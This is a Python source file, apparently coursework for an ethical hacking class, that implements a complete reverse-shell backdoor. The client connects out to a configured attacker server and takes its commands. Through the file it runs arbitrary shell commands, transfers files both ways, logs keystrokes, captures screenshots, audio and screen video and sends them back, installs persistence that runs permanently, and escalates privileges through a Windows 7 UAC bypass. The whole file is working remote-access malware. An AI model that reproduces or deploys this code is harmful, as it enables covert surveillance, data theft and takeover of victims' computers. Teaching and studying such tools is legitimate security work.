################################################
# Author: Watthanasak Jeamwatthanachai, PhD    #
# Class: SIIT Ethical Hacking, 2023-2024       #
################################################

# Import necessary Python modules
import socket  # For network communication
import time  # For adding delays
import subprocess  # For running shell commands
import json  # For encoding and decoding data in JSON format
import os  # For interacting with the operating system

# Import configuration variables  
from configuration import SERVER_IP, SERVER_PORT

# Import enhanced features
keylogger = None
recorder = None  
privilege_escalator = None
persistence_manager = None

import sys
import os

# Add current directory to Python path for imports
current_dir = os.path.dirname(os.path.abspath(__file__))
if current_dir not in sys.path:
    sys.path.insert(0, current_dir)

# Import enhanced features
from features.keylogger import create_keylogger
from features.recording import create_surveillance_recorder
from features.privilege import Windows7PrivilegeEscalator
from features.persistence import create_backdoor_persistence


# Function to send data in a reliable way (encoded as JSON)
def reliable_send(data):
    jsondata = json.dumps(data)  # Convert data to JSON format
    s.send(jsondata.encode())  # Send the encoded data over the network


# Function to receive data in a reliable way (expects JSON data)
def reliable_recv():
    data = ''
    while True:
        try:
            data = data + s.recv(1024).decode().rstrip()  # Receive data in chunks and decode
            return json.loads(data)  # Parse the received JSON data
        except ValueError:
            continue


# Function to establish a connection to a remote host
def connection():
    while True:
        time.sleep(20)  # Wait for 20 seconds before reconnecting (for resilience)
        try:
            # Connect to a remote host using configuration variables
            s.connect((SERVER_IP, SERVER_PORT))  # Use configured IP and port
            # Once connected, enter the shell() function for command execution
            shell()
            # Close the connection when done
            s.close()
            break
        except:
            # If a connection error occurs, retry the connection
            connection()


# Function to upload a file to the remote host
def upload_file(file_name):
    f = open(file_name, 'rb')  # Open the specified file in binary read mode
    s.send(f.read())  # Read and send the file's contents over the network
    f.close()  # Close the file


# Function to download a file from the remote host
def download_file(file_name):
    f = open(file_name, 'wb')  # Open a file for binary write mode
    s.settimeout(1)  # Set a timeout for receiving data
    chunk = s.recv(1024)  # Receive data in chunks of 1024 bytes
    while chunk:
        f.write(chunk)  # Write the received data to the file
        try:
            chunk = s.recv(1024)  # Receive the next chunk
        except socket.timeout as e:
            break
    s.settimeout(None)  # Reset the timeout setting
    f.close()  # Close the file when done


# Main shell function for command execution with enhanced features
def shell():
    global keylogger, recorder, privilege_escalator, persistence_manager
    
    while True:
        # Receive a command from the remote host
        command = reliable_recv()
        
        if command == 'quit':
            # If the command is 'quit', exit the shell loop
            break
        elif command == 'clear':
            # If the command is 'clear', do nothing (used for clearing the screen)
            pass
        elif command == 'help' or command == 'commands':
            help_text = """
BACKDOOR COMMAND REFERENCE
==========================

BASIC COMMANDS:
  quit          - Exit backdoor
  clear         - Clear screen
  cd <path>     - Change directory
  help/commands - Show this help

KEYLOGGER:
  start_keylog  - Start keylogging
  stop_keylog   - Stop keylogging
  dump_keylog   - Get keylog contents

SCREEN RECORDING:
  start_rec     - Start screen recording
  stop_rec      - Stop recording
  dump_rec      - Get recording file

PERSISTENCE:
  persist       - Install persistence

PRIVILEGE ESCALATION (Windows 7):
  check_privs   - Check current privilege level
  escalate      - Perform Event Viewer UAC bypass
  escalate_force - Force privilege escalation
  elevate <cmd> - Execute command with elevated privileges
  test_admin    - Check if running as administrator

SYSTEM:
  <command>     - Execute any system command
            """
            reliable_send(help_text)
        elif command[:3] == 'cd ':
            # If the command starts with 'cd ', change the current directory
            try:
                os.chdir(command[3:])
                reliable_send("Directory changed successfully")
            except Exception as e:
                reliable_send("Error changing directory: " + str(e))
                
        # KEYLOGGER COMMANDS
        elif command == 'start_keylog':
            try:
                if keylogger is None:
                    keylogger = create_keylogger("keylog.txt")
                    if keylogger.start():
                        reliable_send("Keylogger started successfully")
                    else:
                        reliable_send("Failed to start keylogger")
                elif keylogger.start():
                    reliable_send("Keylogger started successfully")
                else:
                    reliable_send("Failed to start keylogger")
            except Exception as e:
                reliable_send("Keylogger error: " + str(e))
                
        elif command == 'stop_keylog':
            try:
                if keylogger and keylogger.stop():
                    reliable_send("Keylogger stopped successfully")
                else:
                    reliable_send("Keylogger not running or failed to stop")
            except Exception as e:
                reliable_send("Stop keylogger error: " + str(e))
                
        elif command == 'get_keylog':
            try:
                with open('keylog.txt', 'r', encoding='utf-8') as f:
                    keylog_data = f.read()
                    if keylog_data:
                        reliable_send(keylog_data)
                    else:
                        reliable_send("Keylog file is empty")
            except Exception as e:
                reliable_send("Error reading keylog: " + str(e))
                
        # RECORDING COMMANDS
        elif command == 'screenshot':
            try:
                if recorder is None:
                    recorder = create_surveillance_recorder("recordings")
                success, result = recorder.screen_recorder.take_screenshot()
                if success:
                    # Send screenshot data as base64
                    import base64
                    screenshot_data = {
                        'action': 'screenshot',
                        'filename': result['filename'],
                        'data': base64.b64encode(result['data']).decode('utf-8'),
                        'size': result['size']
                    }
                    reliable_send(screenshot_data)
                else:
                    reliable_send("Screenshot error: " + str(result))
            except Exception as e:
                reliable_send("Screenshot error: " + str(e))
                
        elif command == 'start_audio':
            try:
                if recorder is None:
                    recorder = create_surveillance_recorder("recordings")
                success, msg = recorder.audio_recorder.start_recording(duration=30)
                reliable_send("Audio recording started: " + str(msg))
            except Exception as e:
                reliable_send("Audio recording error: " + str(e))
                
        elif command == 'start_video':
            try:
                if recorder is None:
                    recorder = create_surveillance_recorder("recordings")
                success, msg = recorder.screen_recorder.start_screen_recording(duration=30)
                reliable_send("Video recording started: " + str(msg))
            except Exception as e:
                reliable_send("Video recording error: " + str(e))
                
        elif command == 'start_recording':
            try:
                if recorder is None:
                    recorder = create_surveillance_recorder("recordings")
                success, msg = recorder.start_surveillance(duration=30, audio=True, video=True)
                reliable_send("Recording started: " + msg)
            except Exception as e:
                reliable_send("Recording error: " + str(e))
                
        elif command == 'stop_audio':
            try:
                if recorder and recorder.audio_recorder.is_recording:
                    success, result = recorder.audio_recorder.stop_recording()
                    if success and isinstance(result, dict):
                        # Send audio data as base64
                        import base64
                        audio_data = {
                            'action': 'audio',
                            'filename': result['filename'],
                            'data': base64.b64encode(result['data']).decode('utf-8'),
                            'size': result['size']
                        }
                        reliable_send(audio_data)
                    else:
                        reliable_send("Stop audio: " + str(result))
                else:
                    reliable_send("No audio recording active")
            except Exception as e:
                reliable_send("Stop audio error: " + str(e))
                
        elif command == 'stop_video':
            try:
                if recorder and recorder.screen_recorder.is_recording:
                    success, result = recorder.screen_recorder.stop_screen_recording()
                    if success and isinstance(result, dict):
                        # Send video data as base64
                        import base64
                        video_data = {
                            'action': 'video',
                            'filename': result['filename'],
                            'data': base64.b64encode(result['data']).decode('utf-8'),
                            'size': result['size']
                        }
                        reliable_send(video_data)
                    else:
                        reliable_send("Stop video: " + str(result))
                else:
                    reliable_send("No video recording active")
            except Exception as e:
                reliable_send("Stop video error: " + str(e))
                
        elif command == 'stop_recording':
            try:
                if recorder:
                    success, result = recorder.stop_surveillance()
                    if success and isinstance(result, dict):
                        # Send recording data as base64
                        import base64
                        recording_data = {
                            'action': 'recording',
                            'audio_filename': result.get('audio_filename'),
                            'audio_data': base64.b64encode(result['audio_data']).decode('utf-8') if result.get('audio_data') else None,
                            'audio_size': result.get('audio_size'),
                            'video_filename': result.get('video_filename'),
                            'video_data': base64.b64encode(result['video_data']).decode('utf-8') if result.get('video_data') else None,
                            'video_size': result.get('video_size')
                        }
                        reliable_send(recording_data)
                    else:
                        reliable_send("Stop recording: " + str(result))
                else:
                    reliable_send("No recording active")
            except Exception as e:
                reliable_send("Stop recording error: " + str(e))
                
        elif command == 'list_recordings':
            try:
                if recorder is None:
                    recorder = create_surveillance_recorder("recordings")
                msg = recorder.list_recordings()
                reliable_send(msg)
            except Exception as e:
                reliable_send("List recordings error: " + str(e))
                
        # PERSISTENCE COMMANDS
        elif command == 'start_persistence':
            try:
                if persistence_manager is None:
                    persistence_manager = create_backdoor_persistence()
                success, msg = persistence_manager.start_persistence_operations()
                reliable_send("Persistence: " + msg)
            except Exception as e:
                reliable_send("Persistence start error: " + str(e))
                
        # Removed stop and status commands - persistence runs permanently

        # PRIVILEGE ESCALATION COMMANDS
        elif command == 'check_privs':
            try:
                if privilege_escalator is None:
                    privilege_escalator = Windows7PrivilegeEscalator()
                reliable_send("Current privileges: " + privilege_escalator.current_privileges)
            except Exception as e:
                reliable_send("Check privileges error: " + str(e))
                
        elif command == 'escalate':
            try:
                if privilege_escalator is None:
                    privilege_escalator = Windows7PrivilegeEscalator()
                success, results = privilege_escalator.escalate_privileges()
                
                # Format the results nicely
                result_text = f"PRIVILEGE ESCALATION ATTEMPT COMPLETE\n"
                result_text += f"SUCCESS: {success}\n\n"
                
                if isinstance(results, dict):
                    for method, result in results.items():
                        if isinstance(result, dict):
                            result_text += f"Method: {method}\n"
                            result_text += f"  Success: {result.get('success', 'Unknown')}\n"
                            result_text += f"  Result: {result.get('result', 'No details')}\n\n"
                        else:
                            result_text += f"Method: {method} -> {str(result)}\n"
                else:
                    result_text += f"Results: {str(results)}\n"
                
                # Add current admin status
                import ctypes
                is_admin = bool(ctypes.windll.shell32.IsUserAnAdmin())
                result_text += f"\nCurrent Admin Status: {is_admin}"
                
                reliable_send(result_text)
            except Exception as e:
                reliable_send("Escalation error: " + str(e))
                
        elif command == 'escalate_force':
            try:
                if privilege_escalator is None:
                    privilege_escalator = Windows7PrivilegeEscalator()
                
                result_text = "FORCING PRIVILEGE ESCALATION (Event Viewer UAC Bypass):\n\n"
                
                # Use our simplified, confirmed working method
                success, result = privilege_escalator.escalate_privileges()
                
                result_text += f"Event Viewer UAC Bypass: {'SUCCESS' if success else 'FAILED'}\n"
                result_text += f"Details: {result}\n\n"
                
                # Check admin status
                import ctypes
                is_admin = bool(ctypes.windll.shell32.IsUserAnAdmin())
                result_text += f"Current Admin Status: {is_admin}\n"
                
                if success and is_admin:
                    result_text += "PRIVILEGE ESCALATION CONFIRMED - NOW RUNNING AS ADMIN!\n"
                elif success and not is_admin:
                    result_text += "UAC bypass executed successfully, but process may need restart for full admin privileges.\n"
                
                reliable_send(result_text)
            except Exception as e:
                reliable_send("Force escalation error: " + str(e))
                
        elif command == 'test_admin':
            try:
                import ctypes
                is_admin = bool(ctypes.windll.shell32.IsUserAnAdmin())
                reliable_send(f"Administrator: {is_admin}")
            except Exception as e:
                reliable_send("Admin test error: " + str(e))
                
        elif command.startswith('elevate '):
            try:
                if privilege_escalator is None:
                    privilege_escalator = Windows7PrivilegeEscalator()
                
                # Extract the command to run with elevated privileges
                cmd_to_run = command[8:]  # Remove 'elevate ' prefix
                
                result_text = f"EXECUTING WITH ELEVATED PRIVILEGES:\n"
                result_text += f"Command: {cmd_to_run}\n\n"
                
                success, output = privilege_escalator.execute_with_elevated_privileges(cmd_to_run)
                
                result_text += f"Success: {success}\n"
                result_text += f"Output:\n{output}\n"
                
                # Check admin status after execution
                import ctypes
                is_admin = bool(ctypes.windll.shell32.IsUserAnAdmin())
                result_text += f"\nCurrent Admin Status: {is_admin}"
                
                reliable_send(result_text)
            except Exception as e:
                reliable_send("Elevated execution error: " + str(e))
                
        elif command == 'privesc_report':
            try:
                if privilege_escalator is None:
                    privilege_escalator = Windows7PrivilegeEscalator()
                report = privilege_escalator.generate_windows7_report()
                # Send abbreviated report to avoid overwhelming the connection
                brief_report = {
                    'current_privileges': report.get('current_privileges'),
                    'system_info': {k: v for k, v in report.get('system_info', {}).items() if k in ['username', 'is_admin', 'windows_version']},
                    'total_opportunities': len(report.get('escalation_opportunities', {}))
                }
                reliable_send("Privilege Report: " + json.dumps(brief_report, indent=2))
            except Exception as e:
                reliable_send("Report error: " + str(e))
                
        elif command == 'remote_privesc_test':
            try:
                # Import and run the comprehensive remote privilege test
                from remote_privesc_test import RemotePrivescTest
                
                test = RemotePrivescTest()
                results = test.run_silent_test()
                
                # Format results for remote display
                output_lines = []
                output_lines.append("REMOTE PRIVILEGE ESCALATION TEST RESULTS")
                output_lines.append("=" * 60)
                
                # Initial status
                initial = results["initial_status"]
                output_lines.append("\n[INITIAL STATUS]")
                output_lines.append(f"  Administrator: {initial['is_admin']}")
                output_lines.append(f"  Admin Access: {initial['admin_access']}")
                output_lines.append(f"  SAM Access: {initial['can_read_sam']}")
                output_lines.append(f"  System32 Write: {initial['can_write_system32']}")
                
                # Escalation results
                if "escalation_attempt" in results:
                    escalation = results["escalation_attempt"]
                    output_lines.append("\n[ESCALATION ATTEMPT]")
                    output_lines.append(f"  Success: {escalation['success']}")
                    output_lines.append(f"  Final Status: {escalation['final_admin_status']}")
                    
                    if isinstance(escalation['details'], dict):
                        output_lines.append("  Method Results:")
                        for method, result in escalation['details'].items():
                            # Truncate long results for network transmission
                            truncated_result = str(result)[:100] + "..." if len(str(result)) > 100 else str(result)
                            output_lines.append(f"    {method}: {truncated_result}")
                
                # Post-escalation capabilities
                post = results["post_escalation"]
                output_lines.append("\n[CAPABILITY TEST]")
                output_lines.append(f"  Create Admin User: {post['can_create_admin_user']}")
                output_lines.append(f"  Modify Registry: {post['can_modify_registry']}")
                output_lines.append(f"  System File Access: {post['can_access_system_files']}")
                output_lines.append(f"  Elevated Commands: {post['can_run_elevated_commands']}")
                
                # Overall assessment
                output_lines.append("\n[ASSESSMENT]")
                if results["initial_status"]["is_admin"] or \
                   (results.get("escalation_attempt", {}).get("success", False)):
                    output_lines.append("  Status: PRIVILEGE ESCALATION SUCCESSFUL")
                    output_lines.append("  Ready for: Remote backdoor deployment")
                else:
                    output_lines.append("  Status: PRIVILEGE ESCALATION FAILED")
                    output_lines.append("  Issue: Cannot gain administrative privileges")
                
                reliable_send("\n".join(output_lines))
                
            except Exception as e:
                reliable_send(f"Remote privilege test error: {str(e)}")
                
        # FILE OPERATIONS
        elif command[:8] == 'download':
            # If the command starts with 'download', upload a file to the remote host
            try:
                upload_file(command[9:])
                reliable_send("File " + command[9:] + " uploaded successfully")
            except Exception as e:
                reliable_send("Download error: " + str(e))
        elif command[:6] == 'upload':
            # If the command starts with 'upload', download a file from the remote host
            try:
                download_file(command[7:])
                reliable_send("File " + command[7:] + " downloaded successfully")
            except Exception as e:
                reliable_send("Upload error: " + str(e))
        else:
            # For other commands, execute them using subprocess
            try:
                execute = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                result = execute.stdout.read() + execute.stderr.read()  # Capture the command's output
                result = result.decode('utf-8', errors='ignore')  # Decode the output to a string
                # Send the command execution result back to the remote host
                if result:
                    reliable_send(result)
                else:
                    reliable_send("Command executed successfully (no output)")
            except Exception as e:
                reliable_send("Command execution error: " + str(e))


# Create a socket object for communication over IPv4 and TCP
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# Start the connection process by calling the connection() function
connection()